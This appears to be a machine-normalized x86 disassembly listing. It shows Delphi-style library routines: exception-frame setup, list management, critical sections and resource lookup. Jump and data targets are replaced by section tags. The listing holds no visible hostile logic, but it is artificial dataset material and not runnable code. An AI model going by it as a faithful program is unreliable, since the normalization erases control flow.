push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417710
xor eax eax
push ebp
push sub_417923
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41792a
mov eax [ rw-data ]
call sub_4177c8
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418454
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4185b0
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41724c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418454
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4185b0
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_41792a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_417950
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_417980
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417710
xor edx edx
push ebp
push sub_4179f7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4177c8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_4039b4
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4185b0
mov edx [ ebp - 0x4 ]
call sub_4171ec
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417a14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417a74
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a7b
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_417a80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417710
xor eax eax
push ebp
push sub_417ac6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417574
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417acd
mov eax [ rw-data ]
call sub_4177c8
retn
sub_417ad4
push ebx
push esi
mov esi eax
mov eax esi
call sub_417a80
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417a14
sub_417af4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417710
xor eax eax
push ebp
push sub_417b59
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417734
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41771c
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b60
mov eax [ rw-data ]
call sub_4177c8
retn
mov eax ebx
call sub_4030e0
mov ebx eax
sub_417b64
push ebp
mov ebp esp
push ebx
push esi
mov ecx edx
test ecx ecx
js r-xdata
mov eax esp
mov esi edx
test esi esi
jl r-xdata
mov ebx [ eax + ecx * 4 ]
dec ecx
push ebx
jns r-xdata
mov esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
inc esi
mov ebx eax
mov eax [ ebx ]
call sub_417af4
add ebx 0x4
dec esi
jne r-xdata
sub_417b98
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417710
xor eax eax
push ebp
push sub_417bda
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4177d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417be1
mov eax [ rw-data ]
call sub_4177c8
retn
sub_417be4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417710
xor eax eax
push ebp
push sub_417c26
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c2d
mov eax [ rw-data ]
call sub_4177c8
retn
sub_417c30
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417710
xor eax eax
push ebp
push sub_417c77
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_417648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c7e
mov eax [ rw-data ]
call sub_4177c8
retn
sub_417c84
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417710
xor eax eax
push ebp
push sub_417cd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417cd9
mov eax [ rw-data ]
call sub_4177c8
retn
sub_417d38
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
pop ebp
retn 0x8
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_417d70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417d38
mov edx eax
mov eax [ rw-data ]
call sub_4188ec
pop edi
pop esi
pop ebx
retn
sub_417d9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418974
mov esi eax
xor edx edx
push ebp
push sub_417e06
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
mov edx ebx
mov eax esi
call sub_4185b0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_4039b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417e18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418974
mov esi eax
xor edx edx
push ebp
push sub_417e82
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
mov edx ebx
mov eax esi
call sub_4185b0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_4039b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407e4c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417ed4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403fa4
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_417f18
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41860c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_418454
sub_417f70
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4185b0
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_417fb0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_417f70
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_417fd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404410
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418048
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41ae54
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_418058
push ebx
call sub_405eec
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405eec
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_418454
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov ebx eax
call sub_405eec
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov ebx eax
call sub_405eec
mov [ eax + 0xc ] ebx
sub_4180b0
push ebx
push esi
push edi
call sub_405eec
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4185b0
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_4180e0
push ebx
push esi
call sub_405eec
mov eax [ eax + 0x8 ]
call sub_403154
call sub_405eec
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418698
mov esi eax
call sub_405eec
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4184a0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405eec
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403154
sub_41813c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4181d2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181d9
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4030e0
call sub_41813c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041b4
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40519c
call sub_4051ec
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_417fd4
or bl al
sub_4181e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418292
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_418273
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40309c
call sub_41813c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_418058
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41827a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4180b0
retn
call sub_4180e0
sub_4182a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b53c
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_418305
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41e6c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41830c
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_418314
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_40309c
push eax
mov eax esi
call sub_40309c
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_4192f0
push eax
mov eax esi
call sub_4192f0
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418421
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4182a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418404
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4182a8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407dd8
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41840b
mov eax [ ebp - 0xc ]
call sub_403154
retn
mov al 0x1
sub_418434
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_418454
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4184a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41853c
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028d8
mov edx esi
mov eax ebx
call sub_4185b0
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418504
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418500
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
jmp sub_403908
sub_41853c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_418584
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405c80
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418504
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41858b
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_4185b0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41853c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4185d8
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41876c
retn
sub_41860c
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41862c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41853c
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028d8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4186a4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41853c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4185b0
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_4184a0
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41862c
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_4186fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41853c
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41874c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41860c
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4184a0
sub_41876c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41853c
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40271c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_4187a8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41853c
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41876c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b5c
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4184a0
dec ebp
inc edi
jne r-xdata
sub_41881c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_418870
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403508
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418974
xor eax eax
push ebp
push sub_4188d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403154
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403144
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188d9
mov eax [ ebp - 0x4 ]
call sub_4189d8
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_4188ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418974
xor eax eax
push ebp
push sub_418968
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418454
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41860c
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41896f
mov eax [ ebp - 0x4 ]
call sub_4189d8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41853c
sub_418988
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418974
xor eax eax
push ebp
push sub_4189cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41874c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189d2
mov eax [ ebp - 0x4 ]
call sub_4189d8
retn
sub_4189e4
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418a38
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_418a38
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_418a14
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026dc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b5c
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
